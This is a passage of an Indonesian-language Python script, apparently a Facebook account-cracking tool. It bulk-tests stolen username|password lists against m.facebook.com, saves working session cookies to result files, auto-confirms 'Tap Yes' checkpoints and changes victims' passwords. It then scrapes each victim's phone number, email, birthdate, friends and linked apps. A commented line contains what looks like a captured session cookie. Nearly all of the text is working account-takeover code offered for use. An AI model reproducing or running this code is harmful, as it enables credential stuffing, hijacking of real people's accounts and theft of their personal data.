		print((("\r[NEW : %s] + %s[%sOLD %s:%s%s]%s + %s[%sPUBLIC %s:%s%s] %s+ %s[%sFOLLOW %s:%s%s]"%(nnew,pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), oldd, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), tmen, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]),  pilih([H, M, U, I, Q, C]), epeq, pilih([H, M, U, I, Q, C])))), end=' ');sys.stdout.flush()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		pass
def rek():
#	cekfile("Hasil")
	cekfile_crk("Hasil")
	namax=input("\n"+inp+"Nama File : ")
	try:
		fila=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Maaf File Tidak DiTemukan")
		rek()
	try:
		volak = namax.split("CP-")[1];copy_ri = ("CP");Ass = ("%s"%(K));aSs = K
	except:
		try:
			vok = namax.split("OK-")[1]
			copy_ri = ("OK")
			Ass = ("%s"%(I))
			aSs = I
		except:
			copy_ri = ("RISKY-JEECK")
			Ass = ("%s"%(C))
			aSs = M
	print(war+"Jumlah Akun :",len(fila),"\n")
	with zthreads(max_workers=30) as (form):
		for data in fila:
			try:
				data = data.replace("\n","")
#					try:
#						dat, data = data.split("OK ")
#					except:pass
				try:user,pw,tll = data.split("|")
				except:user,pw = data.split("|");tll=(" - ")
				print(f"{Q}[{Ass}{copy_ri}{Q}] {aSs}{user}|{pw}|{tll}{Q}")
			except:pass
			time.sleep(0.01)
	input(war+'Tekan Enter !');time.sleep(3)
	menu()
def cpdetect():
	jalan(war+"Sebelum Lanjut Silahkan DiPilih Menu")
	print("[1] Check Opsi Dengan File (masal)")
	print("[2] Check Opsi Dengan Manual (user dan pass)")
	babi = input(war+"Pilih : ")
	if babi in ("1","01"):
		file_all()
		exit()
	elif babi in ("2","02"):
		manual()
		exit()
	else:
		jalan(war+"Isi Dengan Benar Kentod");time.sleep(4)
		cpdetect()
def manual():
	global user,pw,pwBar,ubahP,jarak
	jarak = "     "
	ww=input(war+"Apakah Anda Mau Mengubah Password, Akun Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"Password Baru Untuk Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password Harus 6 Kata/Huruf"))
		else:
			pwBaru.append(pwBar)
	else:pass
	user = input(war+"Username/Email/Idz : ")
	pw = input(war+"Password : ")
	cek_opsi(user, pw)
	input(war+"Back To Menu")
	menu()

def file_all():
	cekfile("Hasil")
	namax=input("\n"+inp+"Nama File : ")
	try:
		fila=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Maaf File Tidak DiTemukan")
		cpdetect()
#	file_cepat(fila)
	file_lambat(fila)
url = "https://m.facebook.com"
jarak = "     "
def file_cepat(file):
	global user,pw,pwBar,ubahP,jarak
	jarak = "     "
	ww=input(war+"Apakah Anda Mau Mengubah Password, Akun Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"Password Baru Untuk Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password Harus 6 Kata/Huruf"))
		else:
			pwBaru.append(pwBar)
	else:pass
	print(war+"Jumlah Akun :",len(file),"\n")
	with zthreads(max_workers=5) as (form):
		for data in file:
			try:
				data = data.replace("\n","")
				try:
					dat, data = data.split("TAP ")
				except:pass
				try:user,pw,tll = data.split("|")
				except:user,pw = data.split("|");tll=(" - ")
				user = user
				pw = pw
				ttl = tll
#				print(f"{war}{user}|{pw}|{ttl}")
				try:
					form.submit(log_hasil, user, pw)
				except:continue
			except:continue
def file_lambat(file):
	global user,pw,pwBar,ubahP,jarak,aman,cp,salah,bz
	bz = 0
	jarak = "     "
	ww=input(war+"Apakah Anda Mau Mengubah Password, Akun Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"Password Baru Untuk Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password Harus 6 Kata/Huruf"))
		else:
			pwBaru.append(pwBar)
	else:pass
	print(war+"Jumlah Akun :",len(file),"\n")
	for data in file:
		try:
			data = data.replace("\n","")
			data = data.replace("TAP ","")
			data = data.replace(" [AZIM-CP] ","")
			data = data.replace(" [×] ","")
			try:user,pww,tll = data.split("|")
			except:user,pww = data.split("|");tll=(" - ")
			user = user
			try:
				pww = pww.split("['")[1]
				pww = pww.split("']")[0]
				pw = pww
			except:
				pw = pww
#				try:
#					ka = pw.split("['")[1]
#					ka = ka.split("']")[0]
#				except:
#					pw = pw
			ttl = tll
	#		print(f"[{str(bz)}] {user}|{pw}|{ttl}")
#			cek_opsi("100073388294385", "maria12345")
			cek_opsi(user, pw)
#		except:continue
		except Exception as e:print("\n[!] Error : %s"%(e));continue
def exceptv1(userq, pwq):
	try:
		cek_opsi(userq, pwq)
	except requests.exceptions.ConnectionError:
		return exceptv1(userq, pwq)
	except:
		return exceptv1(userq, pwq)
def tanya_opsi():
	global opsii
	anjag = input(war+"Apakah Anda Mau Menampilkan Opsi Akun (y/n) : ")
	if anjag in ["1","Yes","ya","y","Y","Ya"]:
		opsii = "y"
	else:
		opsii = ("Risky_Gtg")
def buat_gab():
	global pwBar,ubahP,jarak
	jarak = "     "
	ww=input(war+"Apakah Anda Mau Mengubah Password, Akun Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"Password Baru Untuk Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password Harus 6 Kata/Huruf"))
		else:
			pwBaru.append(pwBar)
	else:
		print(war+"Skip Tap Yes")
def sttt(userr, pww, tta):
	global user,pw,ttl
	try:
		user = userr
		pw = pww
		ttl = tta
		cek_opsi_crack(user, pw, tll)
	except:pass

#########################
# Terima Kasih To Latip #          <<< KNTL
#########################
def cek_opsi(user, pw):
#	global aman,cp,salah
	global url,bz
	bz += 1
	url = "https://m.facebook.com"
	session=req.Session()
	session.headers.update({
		"Host":"m.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://m.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	})
	soup=par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://m.facebook.com"+link.get("action"),data=data)
	response=par(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print(war+"Hidup Matikan Mode Pesawat, Selama 2 Detik !!")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {K}{user}|{pw}{Q}		\n",end="")
			print(f"\r{jarak}{war}Akun Ini Kenak Sesi New					\n\n",end="")
		else:
#			aman+=1
			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
			print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}{Q}        \n",end="")
			print(f"\r{jarak}{Q}[{I}✓{Q}]{C} Cookie: {I}{coki}{Q}\n",end="")
			open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+pw+"|"+coki+"\n")
			get_infoo(session,coki)
			cek_apk(session,coki)
	elif "checkpoint" in session.cookies.get_dict():
#		cp+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=par(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {K} {user}|{pw}{Q}		\n",end="")
#		print(f"\r\33[1;33m[CP] {user} | {pw}								\33[37;1m\n",end="")
		print(f"\r{Q}[{M}!{Q}] Terdapat {K}{len(cek)}{Q} Opsi :	\n",end="")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(session,response,link2)
				else:
					print(f"\r{jarak}{Q}[{I}√{Q}]{I} Selamat Akun Ini Tap Yes {Q}\n{jarak}[{C}+{Q}]{Q} Cookie: {I}{coki}{Q}\n")
					cek_apk(session,coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print(f"\r{jarak}{Q}[{M}×{P}] {M}Akun A2F On            {Q}\n")
			else:
				print(f"\r{jarak}{war}{M}Terjadi Masalah Terhadap Akun{Q}     		\n")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print(f"\r{jarak}{Q}[{C}{number}{Q}] {K}{''.join(opsi)}			{Q}\n",end="")
			print("")
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print(f"\r{jarak}{Q}[{C}{number}{Q}] {K}{''.join(opsi)}			{Q}\n",end="")
#				print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
#				cp-=1
#				aman+=1
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw}|{coki}{Q}        \n",end="")
				open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+pw+"|"+coki+"\n")
				get_infoo(session,coki)
				cek_apk(session,coki)
				
	else:
#		salah+=1
		print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {M}{user}|{pw}{Q}")
		print(f"\r{jarak}{war}{M}Kata Sandi Salah !          {P}\n")
def ubah_pw(session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=par(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwBaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print(f"\r{jarak}{jarak}{Q}[{I}✓{Q}]{I} AKUN INI TAP YES{Q}\n{jarak}{jarak}{Q}[{I}✓{Q}]{I} {user}|{''.join(pwBaru)}|{coki}{Q}\n",end="")
		bokep_japan_yang_terbaru("TAP", user, "".join(pwBaru), "")
		open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+"".join(pwBaru)+"|"+coki+"\n")
		if "checkpoint" not in coki:
			get_infoo(session,coki)
			cek_apk(session,coki)
		else:
			print("")

def get_infoo(session,coki):
	get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://m.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:
		nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:
		nomer = ""
	try:
		email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:
		email=""
	try:
		ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:
		ttl=""
	try:
		teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]

	except:
		teman = ""
	try:
		pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:
		pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	print(f"{jarak}{jarak}[{I}✓{P}] Nama Akun       : {K}{nama}{P}\n{jarak}{jarak}[{I}✓{P}] Jumlah Teman    : {K}{teman}{P}\n{jarak}{jarak}[{I}✓{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}{jarak}[{I}✓{P}] Email Aktif     : {K}{email}{P}\n{jarak}{jarak}[{I}✓{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}{jarak}[{I}✓{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}{jarak}[{I}✓{P}] Tanggal Lahir   : {K}{ttl}{P}")

#user="100043728314612"
#get_infoo(req.Session(), "datr=-KziYXsOIGklnf1lpVPWixL5;fr=0M6ZmZEO7D2wAMWlZ.AWVbRnmNUfUSVkSOihDAOcWsSAU.Bh4qz8.07.AAA.0.0.Bh4qz8.AWX-6sF_RKg;locale=id_ID;noscript=1;sb=_KziYSlS_uNiWDZExeiEsprD;xs=12%3AAjltviY4bwD4bg%3A2%3A1642245375%3A-1%3A10963;c_user=100043728314612")

def ubah_username_to_id(user):
	try:
		if user == "me":
			memek = "me"
		else:
			payload = {"fburl": "https://m.facebook.com/{}".format(user), "check": "Lookup"}
			if "facebook" in user:
				payload = {"fburl": user, "check": "Lookup"}
			mmk = requests.post("https://lookup-id.com/", data=payload).content
			xxx = par(mmk, "html.parser")
			idt = xxx.find("span", id="code")
			asw = idt.text
			memek = asw
		return memek
	except:
		return user
def text_random():
	contol = uuid.uuid4().hex[:10].upper()
	return contol

def cek_apk(session,coki):
	hit1, hit2 = 0,0
	cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki,"user-agent":"Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print(f"{jarak}{jarak}{war}Aplikasi Yang Terkait*")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print(f"{jarak}{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *")
		else:
			print(f"{jarak}{jarak}{jarak}{war}Aplikasi Aktif*")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				print(f"{jarak}{jarak}{jarak}{jarak}{Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			print(f"{jarak}{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *")
		else:
			hit1,hit2=0,0
			print(f"{jarak}{jarak}{jarak}{war}Aplikasi Kedaluwarsa*")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print(f"{jarak}{jarak}{jarak}{jarak}{Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}")
				hit2+=1
	else:
		print(f"{jarak}{war}{M}Cookies Error !")
	print("")

def cek_cookies_by_risky(userr, cokii, memek_mamak_yayan):
	kntl_yayan = ""
	user = userr
	coki = kukis_v1(cokii)
	akun_nn = memek_mamak_yayan
	session = req.Session()


	get_id = session.get("https://m.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://m.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:nomer = ""
	try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:email=""
	try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:ttl=""
	try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
	except:teman = ""
	try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	kntl_yayan += (f"{jarak}{jarak}[{I}✓{P}] Nama Akun       : {K}{nama}{P}\n{jarak}{jarak}[{I}✓{P}] Jumlah Teman    : {K}{teman}{P}\n{jarak}{jarak}[{I}✓{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}{jarak}[{I}✓{P}] Email Aktif     : {K}{email}{P}\n{jarak}{jarak}[{I}✓{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}{jarak}[{I}✓{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}{jarak}[{I}✓{P}] Tanggal Lahir   : {K}{ttl}{P}\n")

	hit1, hit2 = 0,0
	cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		kntl_yayan += (f"{jarak}{jarak}{war}Aplikasi Yang Terkait*\n")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			kntl_yayan += (f"{jarak}{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *\n")
		else:
			kntl_yayan += (f"{jarak}{jarak}{jarak}{war}Aplikasi Aktif*\n")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				kntl_yayan += (f"{jarak}{jarak}{jarak}{jarak}{Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			kntl_yayan += (f"{jarak}{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *\n")
		else:
			hit1,hit2=0,0
			kntl_yayan += (f"{jarak}{jarak}{jarak}{war}Aplikasi Kedaluwarsa*\n")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				kntl_yayan += (f"{jarak}{jarak}{jarak}{jarak}{Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
				hit2+=1
	else:
		kntl_yayan += (f"\r{jarak}{jarak}{war}{M}Cookies Error !\n")
	print(akun_nn+"\n"+kntl_yayan)



def cek_apk_fast(session,coki):
	global mem
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		mem += (f"{jarak}{jarak}{war}Aplikasi Yang Terkait*\n")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			mem += (f"{jarak}{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *\n")
		else:
			mem += (f"{jarak}{jarak}{jarak}{war}Aplikasi Aktif*\n")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				mem += (f"{jarak}{jarak}{jarak}{jarak}{Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			mem += (f"{jarak}{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *\n")
		else:
			hit1,hit2=0,0
			mem += (f"{jarak}{jarak}{jarak}{war}Aplikasi Kedaluwarsa*\n")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				mem += (f"{jarak}{jarak}{jarak}{jarak}{Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
				hit2+=1
	else:
		mem += (f"{jarak}{war}{M}Cookies Error !\n")
	mem += ("\n")

def get_infoo_fast(session,coki):
	global mem
	get_id = session.get("https://m.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://m.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:
		nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:
		nomer = ""
	try:
		email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:
		email=""
	try:
		ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:
		ttl=""
	try:
		teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]

	except:
		teman = ""
	try:
		pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:
		pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	mem += (f"{jarak}[{I}✓{P}] Nama Akun       : {K}{nama}{P}\n{jarak}[{I}✓{P}] Jumlah Teman    : {K}{teman}{P}\n{jarak}[{I}✓{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}[{I}✓{P}] Email Aktif     : {K}{email}{P}\n{jarak}[{I}✓{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}[{I}✓{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}[{I}✓{P}] Tanggal Lahir   : {K}{ttl}{P}")
def log_hasil(user, pasw):
    global mem
    mem = ""
    session=requests.Session()
    session.headers.update({
        "Host":"m.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://m.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://m.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(Q,M,Q)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            mem += (f"\r{Q}[{M}!{Q}]{M}Akun Ini Kenak Sesi New\n")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('Hasil/OK-'+durasi+'.txt', 'a').write(f"{user}|{pasw}|{coki}\n")
            mem += (f"\r{Q}[{I}✓{Q}]{I} Selamat Akun Ini Tidak Check Point\n");mem +=(f"\r{war}{I}Sedang Check Aplikasi !!{Q}\n");time.sleep(0.03)
            cek_apk_fast(session,coki)
            get_infoo_fast(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    mem += (f"\r{Q}[{I}✓{Q}]{I} Selamat Akun Ini Tap Yes\n");mem += (f"\r{war}Mohon Tunggu Sebentar, Sedang Ubah Kata Sandi, Dan Check Aplikasi\n");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "DUMAI-991"
                    mem += (f"\r{Q}[{I}✓{Q}]{I} Selamat Akun Ini Tap Yes");mem += (f"\r{war}Mohon Tunggu Sebentar, Sedang Ubah Kata Sandi, Dan Check Aplikasi\n");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
